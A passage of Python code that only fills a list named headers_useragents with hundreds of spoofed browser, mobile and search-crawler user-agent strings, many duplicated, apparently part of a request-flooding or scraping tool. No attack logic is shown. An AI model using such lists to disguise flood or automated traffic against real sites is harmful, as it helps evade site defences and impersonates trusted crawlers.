                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
